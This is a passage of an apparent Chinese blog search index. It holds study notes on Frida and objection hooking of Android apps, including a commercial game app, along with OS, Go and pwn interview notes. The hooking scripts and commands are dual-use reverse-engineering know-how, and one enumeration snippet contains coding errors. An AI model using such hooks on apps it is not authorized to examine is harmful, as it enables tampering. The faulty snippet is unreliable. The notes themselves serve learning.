analyzing)\",\"语义分析()\",\"生成中间代码\",\"代码生成\",\"汇编\",\"链接\"]},\"88\":{\"h\":\"语法解析(TODO)\"},\"89\":{\"h\":\"TOken生成(TODO)\",\"t\":[\"ebnf语法\"]},\"90\":{\"h\":\"AST生成(TODO)\"},\"91\":{\"h\":\"字面量语法树\"},\"92\":{\"h\":\"一元运算抽象语法树\"},\"93\":{\"h\":\"二元运算抽象语法树\"},\"94\":{\"h\":\"中间代码生成（TODO）\"},\"95\":{\"h\":\"链接与库（TODO）\"},\"96\":{\"h\":\"ld的链接(TODO)\"},\"97\":{\"h\":\"开发框架(TODO)\"},\"98\":{\"h\":\"消息队列\"},\"99\":{\"h\":\"kafka\",\"t\":[\"senfile\",\"零copy技术\"]},\"100\":{\"h\":\"RabbitMQ\"},\"101\":{\"h\":\"RocketMQ\"},\"102\":{\"h\":\"postgreSQL(数据库)\",\"t\":[\"其中的notify推送机制\"]},\"103\":{\"h\":\"asyncio（异步框架）\",\"t\":[\"从状态机角度分析\",\"第十七节：从状态机的角度async和await的实现原理(新) - Yaopengfei - 博客园 (cnblogs.com)\"]},\"104\":{\"h\":\"日志框架\"},\"105\":{\"h\":\"Readme规范学习\",\"t\":[\"上篇学习了git的规范 然后在创立项目的时候 发现其实readme也比较重要 我在以前都忽略了readme的存在于是系统学习学习参考文章一个开源项目的readme文档应该包含哪些信息才算是一份合格的文档？ - 知乎 (zhihu.com)\"]},\"106\":{\"h\":\"必备的信息\"},\"107\":{\"h\":\"项目背景（Background）\",\"t\":[\"介绍为什么要做这个项目 背景和动机是什么\"]},\"108\":{\"h\":\"安装和使用(Install & Usage)\",\"t\":[\"如何安装\",\"如何使用\"]},\"109\":{\"h\":\"[Badge]\",\"t\":[\"是否有类似项目 可以列出来\"]},\"110\":{\"h\":\"主要项目负责人 (Maintainers)\",\"t\":[\"将其他开发者@出来\"]},\"111\":{\"h\":\"参加贡献的方式(Contributing)\",\"t\":[\"写明如何想要进入我们的项目\"]},\"112\":{\"h\":\"开源协议(License)\",\"t\":[\"也就是你的项目采用的开源协议\"]},\"113\":{\"h\":\"frida的基本使用\",\"t\":[\"参考文章Android之Frida框架完全使用指南_android frida-CSDN博客推荐下载书的网站:无名图书 | 一个好看的电子书网站 (book123.info)\"]},\"114\":{\"h\":\"映射端口:\",\"t\":[\"adb forward tcp:xxxx tcp:xxxx \"]},\"115\":{\"h\":\"pc查询手机的进程\",\"t\":[\"frida-ps -U \"]},\"116\":{\"h\":\"hook相关\"},\"117\":{\"h\":\"hook js脚本\"},\"118\":{\"h\":\"附着脚本\",\"t\":[\"启动并且附带脚本\",\"frida -U -f xxxxxx.apk -l xxx.js --no-pause \",\"这里的--no-pause意思是在程序启动后不要停止程序的进程\",\"这里也可以在启动后再 去hook脚本\",\"frida -U -f xxxxx.apk --no-pause %load xxxx.js \"]},\"119\":{\"h\":\"js代码的书写\"},\"120\":{\"h\":\"使用java的平台\",\"t\":[\"使用java平台—>Java.perform(function () {}); \",\"相当于向java层提供了一个callback函数 以便于交互\"]},\"121\":{\"h\":\"获取指定的java类\",\"t\":[\"Java.use(className) \",\"这里引用一下参考文章的列子\",\"当我们获取到Java类之后，我们直接通过 <wrapper>.<method>.implementations =function() {}的方式来hook wrapper类的method方法，不管是实例方法还是静态方法都可以\",\"function main() { //使用java平台 Java.perform( function() { //获取java类 var student=Java.use(\\\"com.example.hookdemo01.Student\\\"); //hook Add方法(重写Add方法) student.Add.implementation=function(a,b) { //修改参数 a=123; b=456; //调用原来的函数 var res = this.Add(a,b); //输出结果 console.log(a,b,res); return res; } } ); } setImmediate(main) \"]},\"122\":{\"h\":\"调用原本的函数\",\"t\":[\"上面举的列子 中出现了调用原本的函数 所以我们其实可以在callback函数里面用this.FUNCTION_NAME来调用原本的函数\",\"<wrapper>.<method>.implementations =function() { this.<method>(); } \"]},\"123\":{\"h\":\"hook重载函数\",\"t\":[\"这里重载函数是java里面的一个特性 就是同一个函数名字 不同的参数列表 可以构造多个同名字的函数 在调用的时候只需要修改参数就可以实现调用不同的实现由于函数名字是一样的所以我猜测frida就难以仅仅靠一个名字来实现hook了 所以我们需要overload标明参数\",\"类似文章中举列子的一样\",\"要hook的代码\",\"public class Student { static public int Add(int a,int b){ return a+b; } static public String test(){ return \\\"test\\\"; } // 要hook的函数 static public String test(int num){ return \\\"test2--\\\"+num; } static public String test(String str){ return str; } } \",\"js代码\",\"//hook重载方法 function hookTest1() { //获取java类 var student=Java.use(\\\"com.example.hookdemo01.Student\\\"); //hook test student.test.overload('int').implementation=function(a) { //修改参数 a=123; //调用原来的函数 var res = this.test(a); //输出结果 console.log(a,res); return res; } } \",\"获取某个重载函数的全部数量\",\"<class>.<function>.overloads.length; \",\"用提取数组的方式依次hook这些重载函数\",\"//hook所有重载函数 function hookTest2() { //获取java类 var student=Java.use(\\\"com.example.hookdemo01.Student\\\"); //重载方法的个数 var overlength=student.test.overloads.length; //循环hook所有重载方法 for(var i=0;i<overlength;i++) { student.test.overloads[i].implementation=function() { //打印参数个数 console.log(arguments.length); return this.test.apply(this,arguments); } } } \"]},\"124\":{\"h\":\"hook构造方法\",\"t\":[\"这里先解释一下什么是构造方法java中类在定义的时候 程序员可以选择显性地去书写和类同名地一个public方法 也可以不写 java会自动给你补上(粗鄙理解)这个方法有什么用呢 就是在这个类实列化的时候 触发 完成类似于初始化的操作比如现在我有类Student那么我在Student a = new Student();的时候相当于会自动去调用函数:a.Student();由于这个是开发知识就不细讲了()\",\"稍微举列子:\",\"package dick; public class Test { public Test() { System.out.print(\\\"test\\\"); } } public class dick { public static void main (String[] args) { Test a = new Test(); } } // 结果:test \",\"对应js的写法\",\"//hook构造函数 function hookTest3() { //获取java类 var student=Java.use(\\\"com.example.hookdemo01.Test\\\"); student.$init.implementation=function() { //调用原函数 this.$init(name,age); //调用构造函数 //student.$new(\\\"guishou\\\",888); } } \"]},\"125\":{\"h\":\"修改类的字段\",\"t\":[\"这里的字段指的是类中定义的成员属性然后这里修改非静态的字段用到的是java.choose函数 这个函数第一个参数就是我们要遍历的类随后我们放入一个类似于回调函数的对象进去这个对象包含:\",\"onMatch\",\"这个key对应的value是一个callback函数 这里会去找到程序中所有实现了指定类的对象 也就是找到所有类型为这个类的对象\",\"相当于遍历 没找到一个对象就会触发这个callback 所以在callback函数中我们的操作对象是每一个对象\",\"onCompete\",\"这个key对应的value也是一个callback函数 在整个搜索流程完成的时候会调用\",\"import java.lang.System.Logger; public class Student { public String name; public int age; private int number; private static String nickname = \\\"Flags\\\"; public Student (String name,int age){ this.age = age; this.name = name; } public void PrintStudent(){ this.number = 888; Log.d(this.name,\\\"nickName:\\\"+this.nickname+\\\"number:\\\"+this.number); } public static void main(String[] args) { System.out.println(\\\"Hello World\\\"); } } \",\"我们这里选择修改nickname这个属性\",\"//修改类字段 function hookTest4() { //获取java类 var student=Java.use(\\\"com.example.hookdemo01.Student\\\"); //修改静态字段 student.nickname.value=\\\"GuiShouFlags\\\"; console.log(student.nickname.value); //修改非静态字段 Java.choose(\\\"com.example.hookdemo01.Student\\\",{ //每遍历一个对象都会调用onMatch onMatch:function(obj) { //修改每个对象的字段 obj.number.value=999; console.log(obj.number.value); //字段名和函数名相同需要加下划线 //obj._number.value=999; }, //遍历完成后调用onComplete onComplete:function() { } }); } \"]},\"126\":{\"h\":\"枚举所有的类和方法\",\"t\":[\"这里很多前提知识\",\"function hookTest6() { //枚举已经加载的类 异步方式 Java.enumerateLoadedClasses({ //每枚举一个类调用一次 onMatch:function(name,handler) { //对类名进行过滤 if(name.indexOf(\\\"com.example.hookdemo01\\\")!=-1) { //输出类名 console.log(name); //根据类名获取java类 var clz=Java.use(name); //获取类的所有方法 var methods=clz.class.getDeclaredMethods(); //循环输出所有方法 for(var i=0;i<methods.length();i++) { console.log(methods[i]); } } }, //枚举完成以后调用 onComplete:function() { } }); //枚举已经加载的类 同步方式 var classes=Java.enumerateClassLoadersSync(); for(var i=0;i<methods.classes();i++) { if(classes[i].indexOf(\\\"com.example.hookdemo01\\\")!=-1) { console.log(classes[i]); //枚举方法同上... } } } \"]},\"127\":{\"h\":\"hook so中的函数\",\"t\":[\"这里如果这个函数不是导出函数则我们通过偏移来获取这个函数这个步骤 就是算偏移嘛(应该 错了别打我) libcBaseAddr + offset\",\"//hook无导出函数 function hookTest9() { //so名称 var so_name=\\\"libnative-lib.so\\\"; //要Hook的函数偏移 var fun_off=0x7078; //加载到内存后，函数地址=so地址+函数偏移 var so_base_addr=Module.findBaseAddress(so_name); var add_func=parseInt(so_base_addr,16)+fun_off; var ptr_fun=new NativePointer(add_func); Interceptor.attach(ptr_fun,{ //在hook函数之前执行 onEnter:function(args) { console.log(\\\"hook enter\\\"); }, //在hook函数之后执行 onLeave:function(retval) { console.log(\\\"hook leaver\\\"); } }); } \"]},\"128\":{\"h\":\"frida的反调试\",\"t\":[\"这里学习到的 我们调试一个程序的时候 我们首先要获取它的包名提前声明这里实战 只是为了学习 学习经验()\"]},\"129\":{\"h\":\"实战\"},\"130\":{\"h\":\"获取包名\",\"t\":[\"这里看教程大概就是 去找到AndroidMainfest.xml文件 然后搜索package=xxxx这个xxxx就是包的名字 \",\"这里我们拿到包名字:com.netease.x19\"]},\"131\":{\"h\":\"hook 一个测试脚本\",\"t\":[\"function main() { Java.enumerateLoadedClasses({ onMatch: function(name, handler) { if(name.indexOf(\\\"com.netease.x19\\\") != -1) { console.log(name); var clz = Java.use(name); var methods = clz.class.getDeclaredMethods(); for(var i = 0; i < methods.length; i++) { console.log(\\\"name:\\\", name, \\\"methods:\\\", methods[i]); } } }, onComplete: function() { } }); } setImmediate( function(){ console.log(\\\"test\\\") Java.perform(main); } ) \",\"然后\",\"我们执行指令\",\"frida -U -f com.netease.x19 -l hook.js --no-pause \",\"然后发生报错:\",\"usage: frida [options] target frida: error: unrecognized arguments: --no-pause \",\"这里搜了去 发现frida在新版本中移除了--no-pause 所以我们就不带这个了\",\"执行完上面的hook指令后发现了报错\",\"Failed to spawn: need Gadget to attach on jailed Android; its default location is: C:\\\\Users\\\\61428\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache\\\\frida\\\\gadget-android-arm64.so \",\"然后搜索发现是我修改了默认的端口号为11451 所以我带上参数:-H 127.0.0.1:11451\",\"frida -H 127.0.0.1:11451 -f com.netease.x19 -l hook.js \",\"执行成功\",\" ____ / _ | Frida 16.1.8 - A world-class dynamic instrumentation toolkit | (_| | > _ | Commands: /_/ |_| help -> Displays the help system . . . . object? -> Display information about 'object' . . . . exit/quit -> Exit . . . . . . . . More info at https://frida.re/docs/home/ . . . . . . . . Connected to 127.0.0.1:11451 (id=socket@127.0.0.1:11451) Spawned `com.netease.x19`. Resuming main thread! [Remote::com.netease.x19 ]-> \",\"然后我们得到了一堆数据 太多了 这里放不下 接下来我们需要筛选(留着后天来写)\"]},\"132\":{\"h\":\"objection 初次体验\",\"t\":[\"学习文章[分享]objection基本操作与实战-Android安全-看雪-安全社区|安全招聘|kanxue.com\",\"objection 使用详解 - ol4three\"]},\"133\":{\"h\":\"链接\",\"t\":[\"我们先通过指令查到我们的包名\",\"adb shell dumpsys window | grep CurrentFocus \",\"这个指令可以查到当前的窗口的包和目前的class\",\"pack_name\",\"执行指令objection -g com.netease.x19 explore\"]},\"134\":{\"h\":\"初步探索\",\"t\":[\"使用指令\",\"android hooking list activities \",\"获取目前加载的class 列表 然后找到我们的com.mojang.minecraftpe 进行hook\",\"hook\",\"android hooking watch class_method com.mojang.minecraftpe.MainActivity --dump-args --dump-backtrace --dump-return \",\"image-20240320105839523\",\"出现了报错\",\"哈哈哈哈 我犯蠢了 应该是class 而不是class_method\",\"android hooking watch class com.mojang.minecraftpe.MainActivity --dump-args --dump-backtrace --dump-return \",\"img\",\"调用了的函数\",\"(agent) [301082] Called com.mojang.minecraftpe.MainActivity.isTextWidgetActive() (agent) [301082] Called com.mojang.minecraftpe.MainActivity.tick() (agent) [301082] Called com.mojang.minecraftpe.MainActivity.getCursorPosition() (agent) [301082] Called com.mojang.minecraftpe.MainActivity.nativeJsCall(java.lang.String, com.mojang.minecraftpe.RNCallPythonRetObj) (agent) [301082] Called com.mojang.minecraftpe.MainActivity.getInstance() (agent) [301082] Called com.mojang.minecraftpe.MainActivity.setRuntimeMsg(java.lang.String) (agent) [301082] Called com.mojang.minecraftpe.MainActivity.nativeSendMessageToJs(java.lang.String) (agent) [301082] Called com.mojang.minecraftpe.MainActivity.doesReactNativeExist() \",\"查看目前top顶部的activity\",\"adb shell dumpsys activity top \"]},\"135\":{\"h\":\"分析\"},\"136\":{\"h\":\"isTextWidgetActive\",\"t\":[\" android hooking watch class_method com.mojang.minecraftpe.MainActivity.isTextWidgetActive --dump-args --dump-backtrace --dump-return \",\"image-20240320113131596\",\"这里看名字就大概知道isTextWidgetActive是检测\",\"然后这个东西被getCursorPosition调用的\"]},\"137\":{\"h\":\"getCursorPosition\",\"t\":[\"image-20240320113426950\",\"返回值-1\"]},\"138\":{\"h\":\"TICK\",\"t\":[\"image-20240320114400575\"]},\"139\":{\"h\":\"Android xml文件分析\",\"t\":[\"主要是说明一些逆向的时候我们需要看的信息 方便我们去分析源码\"]},\"140\":{\"h\":\"学习文章\",\"t\":[\"apk文件大致结构:(https://www.52pojie.cn/thread-1781093-1-1.html)](https://zhuanlan.zhihu.com/p/66800574)\",\"application标签大致说明:android中application标签说明_android application标签引用class内容-CSDN博客\",\"改默认启动activity:在Android Studio中改变默认的启动Activity_android studio在mainactivity之前运行-CSDN博客\",\"详细说明intent-filter :Android中Intent-filter的四个属性Action，Category，Extras，Data - 天涯海角路 - 博客园 (cnblogs.com)\",\"说明intent-filter的action带来的变化:Intent的各种Action - 知乎 (zhihu.com)\"]},\"141\":{\"h\":\"主标签\",\"t\":[\"manifest标签\",\"包含 基本信息 包名、版本号、SDK版本、应用程序的名称和图标\",\"mainifest\",\"application 标签\",\"包含全局属性 :主题 权限等等\",\"列举几个逆向中常用的属性\",\"android:allowClearUserData :是否给用户删除数据的权限\",\"android:debuggable :是否可以使用debug调试 -->一般我们要改成true\",\"包含四大组件的标签 尤其是activity我们一般都是从activity分析起走\",\"application\"]},\"142\":{\"h\":\"默认activity\",\"t\":[\"往往一些实际项目中我们xml文件中有多个activity标签\",\"more_activity\",\"那么问题来了我们的首先启动的activity究竟是什么？ \",\"根据文章在Android Studio中改变默认的启动Activity_android studio在mainactivity之前运行-CSDN博客可以知道可以通过添加<intent-filter>标签来实现设置\"]},\"143\":{\"h\":\"intent-filter标签\",\"t\":[\"参考文章:Android中Intent-filter的四个属性Action，Category，Extras，Data - 天涯海角路 - 博客园 (cnblogs.com)\",\"主要是包含了一些属性 我们就列举一些目前逆向过程中遇见的\",\"action 属性定义了我们的一些系统行为\",\" ACTION_MAIN\",\"定义了Android Application的入口 并且这个属性只能在android应用中有一个\",\"action_main\",\"ACTION_VIEW\",\"会根据不同的参数来打开不同的界面 详细看Intent的各种Action - 知乎 (zhihu.com)\",\"intent_filter_view\",\"Category属性 定义了一些activity的执行方式\",\"CATEGORY_LAUNCHER主要和action中的android.intent.action.MAIN搭配 来确定默认首先进入的activity\"]},\"144\":{\"h\":\"默认activity标志\",\"t\":[\"通过上面信息 我们可以知道 我们有两个特征值 \",\"intent-filter中action\",\"intent-filter中category\",\"main_activity_filter\",\"我们成功筛选出我们的主activity 然后分析即可\"]},\"145\":{\"h\":\"面试准备(热更)\",\"t\":[\"初入职场必备丨二进制面试问题汇总 - FreeBuf网络安全行业门户pwn方向的分析 预计中旬左右\",\"秋招复习笔记——八股文部分：操作系统 - 知乎 (zhihu.com)\"]},\"146\":{\"h\":\"操作系统\",\"t\":[\"csapp:《深入理解计算机系统（CSAPP）》全书学习笔记（详细） - 知乎 (zhihu.com)\"]},\"147\":{\"h\":\"套接字\",\"t\":[\"套接字是一个重要的概念。套接字是一种用于网络通信的接口，它可以实现进程之间的通信和数据传输。在使用套接字进行网络编程时，关闭套接字是一个必要的操作。关闭套接字可以释放资源，避免程序出现内存泄漏等问题。在关闭套接字时，我们通常会用到 close() 和 shutdown() 函数。这两个函数虽然都能够关闭套接字，但是它们的使用方式和作用有所不同。\",\"当调用 close() 函数时，文件描述符的引用计数减1。只有当引用计数变为0时，文件描述符才真正被关闭，并且与其相关的资源被释放。\",\"在fork的时候 子进程会让所有文件描述符copy下来 并且引用计数+1 close本质是对文件描述符的引用计数进行的减1\"]},\"148\":{\"h\":\"Linux 中内存管理\",\"t\":[\"这里有总结linux内存管理（详解） - 知乎 (zhihu.com) 根据总结来进行学习\"]},\"149\":{\"h\":\"tcp和udp区别\",\"t\":[\"直接看博客中写的文章 这里就不重复赘述了\"]},\"150\":{\"h\":\"cow 与row\",\"t\":[\"这里涉及快照的概念 COW、ROW快照技术原理 - 华为 (huawei.com) 快照就用了cow\",\"写时复制技术详解(COW) - 知乎 (zhihu.com)\",\"写时复制（Copy-on-write，简称COW）是一种计算机程序设计领域的优化策略。其核心思想是，如果有多个调用者（callers）同时请求相同资源（如内存或磁盘上的数据存储），他们会共同获取相同的指针指向相同的资源，直到某个调用者试图修改资源的内容时，系统才会真正复制一份专用副本（private copy）给该调用者，而其他调用者所见到的最初的资源仍然保持不变。这过程对其他的调用者都是透明的。此作法主要的优点是如果调用者没有修改该资源，就不会有副本（private copy）被创建，因此多个调用者只是读取操作时可以共享同一份资源。性能较为低下 因为会导致父节点更新 导致写放大也就是本来期望修改一个节点 但是会导致需要修改4个节点之类\",\"简单来说就是 不修改就不拷贝 修改再单独拷贝\"]},\"151\":{\"h\":\"用途\",\"t\":[\"虚拟内存管理中的写时复制 \",\"一般共享访问的页面标记为可读 然后当一个task尝试写入数据的时候 内存管理单元(MMU)会抛出一个异常 内核处理该异常 并且为task分配一个物理内存并复制数据到次内存到中 重新向MMU发出执行该task的写操作\",\"数据存储的写时复制(cow) \",\"linux等文件管理系统采用了cow策略\",\"数据库也采用了该策略\",\"软件应用的写时复制 \",\"cpp中std::string类 以前采用 后面禁止了\"]},\"152\":{\"h\":\"虚拟内存\",\"t\":[\"秋招复习笔记——八股文部分：操作系统 - 知乎 (zhihu.com)\",\"[【操作系统基础】内存管理——虚拟内存概念及分页机制 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/651057404#:~:text=通常一个页表项需要记录20bit的物理页号，因此这样一个虚拟内存管理系统分配给一个程序的页表至少需要2^20*20bit的容量，至少是2.6MByte，而如果是64bit的地址空间，一个页表至少是11%2C258%2C999GByte。 这种机制显然是不合理的。,因此操作系统通过多级页表的方法减少驻留在内存中的页面尺寸，减小页表。 具体来讲，高层页表的页表项并不保存物理页号，而是保存下一级页表的起始地址，如同页表基址寄存器的功能一样。 在这种方式下，操作系统不需要把所有的页表项都存放到内存中，部分页表项成为空洞，在需要用到这个页表项对应的空间时才进行填写。)\",\"操作系统通过多级页表的方法减少驻留在内存中的页面尺寸，减小页表。\",\"虚拟空间连续 但是物理空间不一定连续\",\"当内存空间不足的时候 会把其他正在运行的进程 最近没有使用的内存页面释放暂时写在硬盘上 然后需要了就加载回来\",\"和中断处理机制一样用了选择子和页内偏移的方式来寻址 我们通过页号来获取基础地址再加上页内偏移\",\"多级页表 \",\"通过多级页表来实现逻辑地址到地址的映射\"]},\"153\":{\"h\":\"虚拟地址的cow\",\"t\":[\"不同的进程是可以让虚拟地址共同映射到同一块物理内存地址的\"]},\"154\":{\"h\":\"内存对齐\",\"t\":[\"一文轻松理解内存对齐 - 知乎 (zhihu.com)\",\"要是不对齐的话 系统需要花费额外的操作去读取 十分浪费性能 自然对齐性能利用率高 \",\"这里提及的额外的操作是因为比如32位机子 一次性读取数据就是32位也就是4字节 64位操作系统一次性读取是64位也就是8字节\",\"假如没有内存对齐机制，数据可以任意存放，现在一个int变量存放在从地址1开始的联系四个字节地址中，该处理器去取数据时，要先从0地址开始读取第一个4字节块,剔除不想要的字节（0地址）,然后从地址4开始读取下一个4字节块,同样剔除不要的数据（5，6，7地址）,最后留下的两块数据合并放入寄存器。这需要做很多工作。\"]},\"155\":{\"h\":\"管道\",\"t\":[\"[进程间通信(IPC) 系列 | 管道(pipe) - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/423964093#:~:text=所谓管道，是指用于连接一个读进程和一个写进程，以实现它们之间通信的共享文件，又称 pipe,文件。 向管道（共享文件）提供输入的发送进程（即写进程），以字符流形式将大量的数据送入管道；而接收管道输出的接收进程（即读进程），可从管道中接收数据。)\",\"管道中最重要的2个方法就是管道的读写。从上述的分析来看，读写进程共同操作内核中的数据缓冲区，若有缓冲区可写，则进程往缓冲区中写，若条件不允许写，则进程休眠让出 CPU。读操作同理。\",\"从上述管道读写操作可知，父子进程之所以能够通过 pipe 进行通信，是因为在内核中共同指向了同一个pipe_inode_info 对象，共同操作同一个内存页。\",\"返回的文件描述符是一个数组:fd[0] fd[1] 0表示读取 1表示写入\",\"pipe文件\",\"互斥性 就是管道有一方进行读写操作的时候 另一方必须等待\",\"同步性 管道必须写入后/读取后 然后进入睡眠 等待下一步操作\",\"检测对方是否存在\"]},\"156\":{\"h\":\"并发与并行\",\"t\":[\"[并发与并行的区别（超级通俗易懂）_并发和并行区别秒懂-CSDN博客](https://blog.csdn.net/scarificed/article/details/114645082#:~:text=并发是指一个处理器同时处理多个任务。 并行是指多个处理器或者是多核的处理器同时处理多个不同的任务。,并发是逻辑上的同时发生（simultaneous），而并行是物理上的同时发生。 来个比喻：并发是一个人同时吃三个馒头，而并行是三个人同时吃三个馒头。)\",\"并发是一个cpu同时处理多个任务 单一时间只能执行一种指令 但是在各个任务之间来回切换\",\"并行是多个cpu同时执行多个任务 多个任务物理意义上的同时运行\",\"并发与并行\"]},\"157\":{\"h\":\"文件描述符\",\"t\":[\"件描述符（file descriptor）就是内核为了高效管理这些已经被打开的文件所创建的索引，其是一个非负整数（通常是小整数），用于指代被打开的文件，所有执行I/O操作的系统调用都通过文件描述符来实现。同时还规定系统刚刚启动的时候，0是标准输入，1是标准输出，2是标准错误。这意味着如果此时去打开一个新的文件，它的文件描述符会是3，再打开一个文件文件描述符就是4......[彻底弄懂 Linux 下的文件描述符（fd） - 锦瑟，无端 - 博客园 (cnblogs.com)](https://www.cnblogs.com/cscshi/p/15705033.html#:~:text=文件描述符（file,descriptor）就是内核为了高效管理这些已经被打开的文件所创建的索引，其是一个非负整数（通常是小整数），用于指代被打开的文件，所有执行I%2FO操作的系统调用都通过文件描述符来实现。 同时还规定系统刚刚启动的时候，0是标准输入，1是标准输出，2是标准错误。)\",\"进程之间文件描述符相互独立 可以互不影响\",\"可以通过fork让 不同的进程之间 同一个文件描述符指向 同一个文件\",\"本质也就是先用一个数组来存每个进程的空闲文件描述符数组 然后数组存储的是一个下标再指向真正的文件描述符数组 然后里面存储着详细信息 包含filenode等信息就可以找到文件本体了\"]},\"158\":{\"h\":\"fork函数\",\"t\":[\"论fork()函数与Linux中的多线程编程 - 知乎 (zhihu.com)，\",\"有关 COW (CopyOnWrite) 的一切 - 知乎 (zhihu.com)\",\"操作系统需要将父进程虚拟内存空间中的大部分内容全部复制到子进程中（主要是数据段、堆、栈；代码段共享）\",\"fork还是接触比较多 在程序中或者ctf题中 有时候fork可以带来一些新的思路\",\"fork函数是创建一个新的进程 并且copy 父进程的栈堆代码等段信息\",\"子进程会获取父进程的所有文件副本 所以文件描述符也是操作的对应一样的文件\",\"当fork函数调用用了新的进程后 如果马上调用exec加载新的程序 那么fork之前执行的栈堆代码段等的拷贝就是白用工 胡总和说性能损失巨大 所以fork函数采用了cow技术 只有当进程尝试写入共享区域的某个页面的时候 才会为这个页面创建一个新的副本\",\"exec并不会导致pid的改变 直接将新的程序的用户空间代码和数据完全替换当前进程\",\"虚拟内存管理技术\",\"img\",\"只有当进程实际访问内存资源的时候才会建立虚拟地址和物理地址的映射 调入物理内存页\",\"直接映射区\",\"前（最小）896mb的内核空间是与物理地址前896mb 直接进行的映射\",\"动态内存映射区\",\"该区域由vmalloc进行分配 线性空间连续 对应的物理空间不一定连续 可能是处于低端或者高端的内存中\",\"永久内存映射区\",\"这个区域可以访问高端内存 alloc_page分配高端内存页 kmap函数可以通过将高端的内存映射到该区域去\",\"固定内存映射区\",\"这里的地址有特殊用途\"]},\"159\":{\"h\":\"fork的cow技术\",\"t\":[\"当创建子进程的时候父进程直接将虚拟内存到物理内存的映射关系复制到子进程中 并且将内存设置为只读这样写入的时候就会触发缺页保护\",\"当不同进程要对内存数据进行修改的时候就会触发写时复制(cow)机制 才会进行拷贝\",\"image-20240511234355582\",\"触发缺页异常后 内核在缺页异常的回调处理函数中进行物理内存页的复制 并且把内存页设置为可读可写状态\"]},\"160\":{\"h\":\"重定向\",\"t\":[\"1>也就是标准输出流定向到某个文件种\",\"2>也就是错误输出流定向到某个文件种\",\"所以在禁用了1情况下可以通过重定向到0\",\"以及其实直接向0输出也是可以的 但是pwntools在本地是无法接受到这个的\"]},\"161\":{\"h\":\"信号中断\",\"t\":[\"操作系统中的中断（详细介绍+图片理解）_系统运行中断情况监控图-CSDN博客\"]},\"162\":{\"h\":\"类型\",\"t\":[\"我们可以大致把中断分为中断和异常 异常还分为故障 陷阱 中止 中断还有:硬中断 软中断之分 硬中断也就是中断异常这类 而软中断比如:int 0x80之类的\",\"中断是异步的 \",\"比如鼠标点击之类的\",\"异常是同步的 \",\"比如cpu的异常事件 缺页异常 错误指令异常等\",\"软件中断 \",\"与硬中断不同 硬中断是每完成一个生命周期后都会去检测一下有没有中断信号 然后去完成中断处理操作 而软中断是单独有个守护进程不断轮询标志位 软中断更类似于注册了一个对象列表 然后不断轮询这个列表查看标志位 如果标志位发生了改变 就去调用对应的处理函数 这是一种比较先进的思想\",\"硬中断更像是响应 因为cpu的时间是宝贵的 所以会在响应后 交给软中断来处理 这样才能实现较高的利用效率\"]},\"163\":{\"h\":\"处理\",\"t\":[\"当接收到中断信号后 就会根据中断信号 去找中断描述符表(IDT 通过idtr寄存器找到IDT地址)中寻找段选择子和段内偏移 通过段选择子去全局描述符(GDT)中寻找基地址 然后加上偏移地址获取真正的地址 如果开了分页机制 那么再根据这个地址进行分页转化 也就是线性地址转向真实的物理地址（比如二级分页机制的话 前10位获取页目录项从而定位到页目录再通过中12位获取页目录中第几项获取其基础地址然后加上最后10位偏移地址获取真实的地址）\"]},\"164\":{\"h\":\"GO底层\",\"t\":[\"网站是看的这个:Introduction · 深入解析Go (gitbooks.io)\",\"书籍是Go语言设计与实现\"]},\"165\":{\"h\":\"面试技巧\",\"t\":[\"协程，是一种比线程更加轻量级的存在。正如一个进程可以拥有多个线程一样，一个线程也可以拥有多个协程。\",\"最重要的是，协程不是被操作系统内核所管理，而完全是由程序所控制（也就是在用户态中执行）。\",\"切片是引用类型 而数组是值类型 []int这样定义是切片 [4]int这样定义是数组 然后数组传递过去不会导致原本的值改变 切片会导致\"]},\"166\":{\"h\":\"结构体中指针函数和普通函数\",\"t\":[\"比如我定义一个结构体\",\"type A struct { } func (a *A)Func1(){} func (a A)Func2(){} \",\"这里的a 其实由于golang都是值传递 所以在 func1 中a *则是a的指针被传递过去 然后对a进行操作的话 会修改变量的值 但是如果func2中对a进行操作就是对a的备份进行操作无法修改原本的值\"]},\"167\":{\"h\":\"字典实现\",\"t\":[\"是通过hash链表 大概就是首先通过链表把各个桶链接起来 然后对key进行取hash然后取余 得到下标如果下标一致 则直接在桶后面添加这个value\"]},\"168\":{\"h\":\"接口实现\",\"t\":[\"结构体中存储类型的hash值 并且存储一个unsafe指针 这样就可以实现各个类型的断言转化了\"]},\"169\":{\"h\":\"数组实现\",\"t\":[\"数组主要是结构体中存储了长度 然后存储数组指针\"]},\"170\":{\"h\":\"切片实现\",\"t\":[\"结构体中存储了长度和容量以及指针这样就可以实现动态扩容了\"]},\"171\":{\"h\":\"函数调用规范\",\"t\":[\"先压入返回地址 然后压入参数最后压入返回参数 所以go的函数调用参数和返回值都是依赖于栈进行传递的\",\"并且golang中的参数传递都是值传递 也就是拷贝一份\"]},\"172\":{\"h\":\"深/浅copy\",\"t\":[\"Go语言讲解深拷贝与浅拷贝 - 简书 (jianshu.com)\",\"深copy是复制对象的值 创建一个新的对象进行存储 所以修改新对象 不会影响原对象的值 内存地址不同\",\"浅copy是复制对象的指针 这样新对象修改的时候老对象也会发生变化 比如Slice Map\",\"package main import \\\"fmt\\\" func main() { slices1 := []int{ 1, 2, 3, 4, } slices3 := []int{ 1, 2, 3, 4, } slices4 := slices3[1:] slices4[1] = 6 slice2 := slices1 slice2[1] = 6 fmt.Println(slices1) fmt.Println(slices1) // [1 6 3 4] //[1 6 3 4] } \"]},\"173\":{\"h\":\"闭包\",\"t\":[\"在go语言中闭包函数 所引用的父类变量都不能在栈上分配 因为这样父函数执行完毕后栈上变量就失效了 所以这些变量都是在堆上分配的 会专门产生一个闭包结构体来存储这些外部引用变量\"]},\"174\":{\"h\":\"一等公民\",\"t\":[\"高阶函数编程：探索Go语言中的函数一等公民-腾讯云开发者社区-腾讯云 (tencent.com)\",\"在给定的编程语言设计中，一等公民是指支持所有通常可用于其他实体的操作的实体。这些操作通常包括作为参数传递、从函数返回和赋值给变量。\",\"参数传递\",\"函数返回值\",\"赋值给变量\"]},\"175\":{\"h\":\"Pwn\"},\"176\":{\"h\":\"ret2dl\",\"t\":[\"流程是 先执行跳转到GOT[3] 然后GOT[3]存储的是plt[1] 也就是先压reloc_arg参数 然后jmp到plt[0] plt[0]存储的是push link_map(GOT[1]) 然后跳转到_dl_runtime_resolve函数也就是GOT[2]\",\"然后分析一下两个参数 一个是reloc_arg 我们可以通过这个知道我们要绑定的函数名字 也就是从reloc_arg为下标 然后rel_plt[reloc_arg]获取elf_rel信息 提取elf_rel.r_info信息 